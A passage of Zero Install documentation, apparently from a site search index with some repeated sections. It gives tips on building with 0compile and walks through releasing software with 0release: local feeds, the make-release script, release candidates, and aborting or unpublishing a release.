Python 2.7.3, then the binary will have <version not-before='2.7' before='2.8'/> : <compile:implementation> <runner interface= 'https://apps.0install.net/python/python.xml' > <version compile:pin-components= \"2\" /> </runner> </compile:implementation> (added in 0compile 1.4) Tips \u00b6 Using a separate source feed \u00b6 You can keep the source implementations in a separate file ( MyProg-src.xml ) and add a feed from the main feed, e.g.: <feed src= 'http://mysite/interfaces/MyProg-src.xml' arch= '*-src' /> The arch attribute lets the injector know that it doesn't need to fetch this file unless it's looking for source code. Making library headers available (-dev packages) \u00b6 See Make-headers for information about publishing library source and -dev packages. Python distutils \u00b6 You should use the --build-base option to make distutils build to 0compile's build directory, not under the source code (which is read-only). Unfortunately, this option isn't available with the install command, so you have to do the build in two steps. A typical command is: cd \" $SRCDIR \" && python setup.py build --build-base = \" $BUILDDIR /build\" && cd \" $BUILDDIR \" && python \" $SRCDIR \" /setup.py install --home = \" $DISTDIR \" --skip-build Examples \u00b6 There are some template projects which can be used as a starting point for publishing your own software for various languages and build systems.

This is almost exactly the same as adding binaries, except that you give src as the machine (CPU) type: (if you want to script this process, take a look at 0template ) You can also edit the XML directly, which gives more control.

It handles details such as setting the version number and release date, tagging the release in your version control system and updating your Zero Install feed. The general process for an architecture-independent package (e.g. a Python program) is shown in the diagram below ( releasing a source package and multiple binary packages is also possible): After doing some development (so you have something to release!) you use 0release to prepare a new release. It will: Commit a release revision in your version control system (e.g. with a version of 1.3 ) on a new temporary branch. Export the release revision and create a tarball for distribution. Unpack the release and run the unit tests. Update the version numbers in your version control system again (e.g. to 1.3-post ). You can then run any final (manual) tests on the release. If you're happy with the result, then 0release can publish it (e.g. submit the release to 0repo, and push the new commits and tag to your public version control system). Otherwise, 0release will discard the temporary branch so that you can fix the problems and try again. Note You don't need to use this program to make your software available through Zero Install. You can just create a tarball using your normal process and then publish a feed for it. However, 0release can automate some of the steps for you. It's especially useful for new projects, where you don't yet have an established process. Having a program to handle new releases brings several advantages over doing it manually: Making a new release is quicker, since many steps are automated. You can't forget some steps (did you forget to tag version 1.2? did you remember to compile the translations in 1.4? etc). You get a consistent structure each time (are your archives called myprog-V.VV-linux.tgz or My-Prog-Linux-V.VV.tar.gz ?). If someone else needs to make a release, they will follow the same process. Git is fully supported. It should be fairly easy to support other (distributed) version control systems. Preparing your source repository \u00b6 You'll need a local feed within your source directory (under version control). This contains the same information as a normal published feed would (name, description, dependencies, etc). The only differences are: The local feed refers to a local directory (e.g. id=\".\" for the directory containing the local feed) rather than a secure hash. It has no digital signature. The version will be a development version (e.g 1.2-post if your last released version was 1.2 ). Having a local feed is useful even if you don't use 0release , because it lets people check out a development snapshot of your program and then register it (using 0install add-feed ) or run it directly with Zero Install handling its dependencies. A minimal Hello World example is available for testing. You can check it out like this, using the Git version control system: $ git clone git://github.com/0install/hello-python.git To check that you can run it, use 0install on the feed: $ cd hello-python $ 0install run HelloWorld.xml Hello World! HelloWorld.xml is the local feed. Its contents look like this: <?xml version=\"1.0\" ?> <interface xmlns= \"http://zero-install.sourceforge.net/2004/injector/interface\" > <name> HelloWorld </name> <summary> minimal demonstration package for 0release </summary> <description> This program outputs the message \"Hello World\". You can create new releases of it using 0release. </description> <homepage> http://0install.net/0release.xml </homepage> <feed-for interface= 'http://0install.net/tests/HelloWorld.xml' /> <implementation id= \".\" version= \"0.1-pre\" > <command name= 'run' path= 'hello.py' > <runner interface= 'https://apps.0install.net/python/python.xml' > <version before= '3' /> </runner> </command> </implementation> </interface> Note the <feed-for> element. This is where the main feed is (or will be) published. If you want to follow this tutorial, change it to point to a location to which you can upload files (e.g. http://localhost/~me/testing/HelloWorld.xml ) and commit the change ( git commit -a ). You should add any dependencies inside the <implementation> element (see the feed specification for details, or edit the feed using 0publish-gui if you want a graphical interface). This example program is so simple it doesn't have any dependencies beyond its interpreter: Python < 3 Creating the releases directory \u00b6 Each time you create a new release, the resulting files go in your releases directory. Create the directory now and then run 0release inside it, giving it the location of your local feed. $ mkdir -p ~/releases/hello $ cd ~/releases/hello $ 0install run http://0install.net/2007/interfaces/0release.xml ~/hello-python/HelloWorld.xml Setting up releases directory for HelloWorld Success - created script: ~/releases/hello/make-release Now edit it with your local settings. Then, create new releases by running it. This will create a single executable file in the directory, called make-release . Run this whenever you want to create a new release of your software. The make-release file contains local configuration information (e.g. the location of the local feed on your computer). General information about your program goes in the source directory so it can be shared by other developers. The final script might look like this: #!/bin/sh # Your public version control repository. When publishing, the new # HEAD and the release tag will be pushed to this using a command # such as \"git push origin master v0.1\" # If unset, you'll have to update it yourself. PUBLIC_SCM_REPOSITORY = origin cd ` dirname \" $0 \" ` exec 0install run http://0install.net/2007/interfaces/0release.xml \\ --release ~/hello/HelloWorld.xml \\ --public-scm-repository = \" $PUBLIC_SCM_REPOSITORY \" \\ \" $@ \" Warning Do not put make-release under the project's version control! First, because it contains user-specific information, and secondly because if you make a mistake then 0release will make you retract the release and restart the whole release process from the beginning because you changed a file that's part of the release... this is not fun ;-) Creating a release candidate \u00b6 When you want to make a new release, simply run the make-release script, like this: $ cd ~/releases/hello $ ./make-release Releasing HelloWorld Snapshot version is 0 .1-pre Version number for new release [ 0 .1 ] : You are prompted to enter the version number for the new release. You can just press Return to accept the default of 0.1 (since the version in the local feed was 0.1-pre ). It then prints: Releasing version 0 .1 HEAD is now at 387535a Updated feed-for to localhost for testing SKIPPED unit tests for ~/releases/hello/0.1/helloworld-0.1/HelloWorld.xml ( no 'test' command ) Wrote source feed as helloworld-0.1.xml Wrote changelog from start to here as changelog-0.1 Candidate release archive: helloworld-0.1.tar.bz2 ( extracted to ~/releases/hello/0.1/helloworld-0.1 for inspection ) Please check candidate and select an action: P ) Publish candidate ( accept ) F ) Fail candidate ( delete release-status file ) ( you can also hit CTRL-C and resume this script when done ) Publish/Fail: 0release has now created a candidate archive for you to examine. You might like to try running the program now. Note that the archive only contains files that are under version control. You can either leave 0release running while you check it, or you can press CTRL-C to exit and run the make-release script again later. It will remember where it was (it stores the current status in a new release-status file). As well as exporting the release archive, 0release also updates your Git repository by committing two new revisions. You can see them using gitk --all : The lowest two revisions are the history you started with. The master branch adds the commit where you changed the <feed-for> element. This is also the currently checked-out version. 0release has created a new branch called 0release-tmp with two new revisions. Release 0.1 is the version that will be released. Its local feed has the version 0.1 and today's date as the release date. The archive was created from this revision. The next revision has a version of 0.1-post and removes the release date again. Note that the release hasn't been tagged yet in Git, but 0release has recorded the revision ID in case you decide to accept the release candidate. If you discover any problems you can go ahead and commit a fix, which will appear on the master branch (not on the 0release-tmp branch, which will be discarded if you fail the release). Accepting the release candidate \u00b6 We'll just check that the release works: $ 0install run 0 .1/helloworld-0.1/HelloWorld.xml Hello World! Looks good. If you killed the release script (with CTRL-C), run it again now to return to the Publish/Fail prompt. Choose Publish (you can just type p<Return> ). Note 0release will sign the release tag using your GPG key. If you don't have one, use gpg --gen-key to create one now. If you have multiple keys, pass -k ID to 0release to choose which one you want to use. The temporary files ( release-status and the extracted helloworld-0.1 directory) are removed, and it creates a merged.xml feed. In our case, that's just the same as the one we tested, but if we were releasing a program that needed compiling, it would gather together the source and all the binaries into one feed here. Finally, it hands this off to 0repo : Tagged as v0.1 HEAD is now at 07f3c9e Start development series 0 .1-post Deleted branch 0release-tmp ( was f9fb36a ) . Handing off to 0repo: 0repo add -- merged.xml [ ... ] If you check your Git repository, you'll see that 0release has now tagged the release, and updated the \"master\" branch to the tip of the temporary branch: If, instead, you had found a problem with the release you would have selected Fail at the prompt. 0release would have removed the temporary branch (leaving master where it was) and deleted the temporary files. Customising the release process \u00b6 For more information, see release phases . Source and binaries \u00b6 If your program needs to be compiled, see Releasing binaries . Aborting a release \u00b6 You can abort a release easily at any point before the Publish step. Once you select Publish , externally-visible changes start to be made (e.g. archives are uploaded to your file-server). To abort before publishing Just select Fail from the menu. This deletes the release-status file (which you could also do manually). To avoid confusion, selecting Fail also removes the temporary release branch from Git and renames the release directory (to $version~ ) to make it clear that they're not being used. To abort after publishing has started Follow the steps in Unpublishing a release below to undo any publicly visible changes. Then delete the release-status file. Unpublishing a release \u00b6 So, you didn't test the release properly, and now you want to pull it down, eh? The best way to do this is to set the stability to BUGGY in the public feed (and re-run 0repo to regenerate the signature), and then publish a new fixed release, with a new version number. But if you really insist on trying to unpublish a release and pretending it never happened, here's what you have to do: Edit the master feed (in 0repo's feeds directory) and delete the new <implementation> . Run 0repo to sign and publish the updated feed. Note: if you keep your feed under version control then you could revert the change. However, if anyone got the new version before you reverted it, then 0install will refuse to go back to the previous version, assuming that this is a replay attack. So create a new signature, with a fresh time-stamp. Reset HEAD to before the release (e.g. git reset --hard v0.1^ ) and delete the tag itself (e.g. git tag -d v0.1 ). Delete the remote tag at the server (e.g. git push origin :v0.1 master ). Like 0install , if anyone saw the release in Git, their Git will refuse to go back to an older version. Tell them to use -f . Delete the tarball from your server. Do I need to keep the releases directory? \u00b6 It's best to keep the releases directory: You want to keep the make-release script so you don't have to write it again each time. Keeping the previous archive allows diffing against it as an extra check when making a new release. So, there's nothing too critical in the directory, but it's easiest to keep everything. TODO: 0release should also be able to diff against the previous version using the cache (downloading the archive if missing), rather than relying on the previous archive being in the releases directory.","title":"0release"},{"location":"tools/0release/#0release","text":"Maintainer: Thomas Leonard License: GNU Lesser General Public License Source: https://github.com/0install/0release Zero Install feed: http://0install.net/2007/interfaces/0release.xml 0release can be used to make new releases of your software. It handles details such as setting the version number and release date, tagging the release in your version control system and updating your Zero Install feed. The general process for an architecture-independent package (e.g. a Python program) is shown in the diagram below ( releasing a source package and multiple binary packages is also possible): After doing some development (so you have something to release!) you use 0release to prepare a new release. It will: Commit a release revision in your version control system (e.g. with a version of 1.3 ) on a new temporary branch. Export the release revision and create a tarball for distribution. Unpack the release and run the unit tests. Update the version numbers in your version control system again (e.g. to 1.3-post ). You can then run any final (manual) tests on the release. If you're happy with the result, then 0release can publish it (e.g. submit the release to 0repo, and push the new commits and tag to your public version control system). Otherwise, 0release will discard the temporary branch so that you can fix the problems and try again. Note You don't need to use this program to make your software available through Zero Install. You can just create a tarball using your normal process and then publish a feed for it. However, 0release can automate some of the steps for you. It's especially useful for new projects, where you don't yet have an established process. Having a program to handle new releases brings several advantages over doing it manually: Making a new release is quicker, since many steps are automated. You can't forget some steps (did you forget to tag version 1.2? did you remember to compile the translations in 1.4? etc). You get a consistent structure each time (are your archives called myprog-V.VV-linux.tgz or My-Prog-Linux-V.VV.tar.gz ?). If someone else needs to make a release, they will follow the same process. Git is fully supported. It should be fairly easy to support other (distributed) version control systems.","title":"0release"},{"location":"tools/0release/#preparing-your-source-repository","text":"You'll need a local feed within your source directory (under version control). This contains the same information as a normal published feed would (name, description, dependencies, etc). The only differences are: The local feed refers to a local directory (e.g. id=\".\" for the directory containing the local feed) rather than a secure hash. It has no digital signature. The version will be a development version (e.g 1.2-post if your last released version was 1.2 ). Having a local feed is useful even if you don't use 0release , because it lets people check out a development snapshot of your program and then register it (using 0install add-feed ) or run it directly with Zero Install handling its dependencies. A minimal Hello World example is available for testing. You can check it out like this, using the Git version control system: $ git clone git://github.com/0install/hello-python.git To check that you can run it, use 0install on the feed: $ cd hello-python $ 0install run HelloWorld.xml Hello World!
